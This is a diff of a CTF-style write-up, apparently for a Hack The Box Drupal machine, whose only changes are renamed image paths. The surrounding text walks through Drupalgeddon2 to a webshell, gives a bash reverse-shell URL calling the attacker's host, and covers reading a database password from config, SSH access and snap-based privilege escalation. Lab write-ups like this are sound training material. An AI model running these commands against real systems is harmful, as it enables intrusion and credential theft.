@@ -22,7 +22,7 @@ Drupal 7.56 is vulnerable to the Drupalgeddon2 RCE exploit.
 
 We can use this to easily put a webshell on the page. The exploit would put a `shell.php` file on the webserver that takes a `c` parameter for the RCE.
 
-<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (156) (3).png" alt=""><figcaption></figcaption></figure>
 
 By going to `http://10.10.10.223/shell.php?c=bash+-i+>&+/dev/tcp/10.10.14.9/4444+0>&1`, we would get a shell.
 
@@ -34,7 +34,7 @@ By going to `http://10.10.10.223/shell.php?c=bash+-i+>&+/dev/tcp/10.10.14.9/4444
 
 Within the Drupal configuration files at `/sites/default/settings`, we can find a password for the SQL database.
 
-<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (155) (3).png" alt=""><figcaption></figcaption></figure>
 
 With this, we can login to the SQL server and enumerate the database. By dumping the users table from the drupal database, we can find a username and hash.
 
@@ -50,11 +50,11 @@ Then we can SSH in as the `brucetherealadmin` user using this credential.
 
 When checking sudo privilges of this machine, we see that we can run `snap`.
 
-<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (102) (3).png" alt=""><figcaption></figcaption></figure>
 
 By checking the snap version, we can see that this is not vulnerable to the dirty sock exploit because it is updated.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (148) (3).png" alt=""><figcaption></figcaption></figure>
 
 However, because we run `snap` as root, this means that we can create a malicious snap package to be downloaded, and the imported package would run the dirty\_sock exploit.
 
